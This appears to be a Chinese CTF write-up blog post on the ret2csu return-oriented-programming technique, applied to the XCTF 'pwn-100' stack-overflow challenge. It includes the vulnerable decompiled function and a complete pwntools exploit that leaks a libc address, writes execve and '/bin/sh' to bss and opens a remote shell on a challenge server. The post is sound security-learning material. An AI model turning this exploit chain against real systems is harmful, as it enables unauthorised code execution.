---
title: ret2csu学习笔记
author: Ch4rc0al
date: 2021-07-21T13:52:03+08:00
categories:
  - WriteUps
tags:
  - Pwn	
  - CTF
---



最近学习了中级Rop中的`ret2csu`技巧，记录一篇WP来巩固学习

<!--more-->

## pwn-100

[例题 pwn-100](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4888&page=1)

>     Arch:     amd64-64-little
>     RELRO:    Partial RELRO
>     Stack:    No canary found
>     NX:       NX enabled
>     PIE:      No PIE (0x400000)

```c
int sub_40068E()
{
  char v1[64]; // [rsp+0h] [rbp-40h] BYREF

  sub_40063D((__int64)v1, 200);
  return puts("bye~");
}
```

此处有栈溢出漏洞，并且可以溢出很大

程序可以调用`puts`和`read`

思路：通过`ret2csu`调用`puts`获取`puts`函数的真实地址，通过`LibcSearcher`拿到基地址，调用`read`向bss段写入`execve`和`/bin/sh\x00`，调用`execve`拿到shell

```
from pwn import *
from LibcSearcher import LibcSearcher
context(os='linux',arch='amd64',log_level='debug')

sh=remote('111.200.241.244',53809)
#sh=process('./pwn100')
elf=ELF('./pwn100')
csu_end=0x40075A
csu_front=0x400740
puts_got=elf.got['puts']
read_got=elf.got['read']
main=0x40068e
bss_base=elf.bss();

def csu(rbx,rbp,r12,r13,r14,r15,last):
    payload='a'*0x40+'bbbbbbbb'
    payload+=p64(csu_end)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    payload+=p64(csu_front)+'a'*0x38+p64(last)
    sh.send(payload)
    sh.recvuntil('bye~\n')

csu(0,1,puts_got,0,0,puts_got,main)
puts_addr=u64(sh.recv()[:-1].ljust(0x8,'\x00'))


libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')

execve_addr = libc_base + libc.dump('execve')

csu(0,1,read_got,16,bss_base,0,main)

sh.send(p64(execve_addr)+'/bin/sh\x00')

csu(0,1,bss_base,0,0,bss_base+0x8,main)

sh.interactive()
```

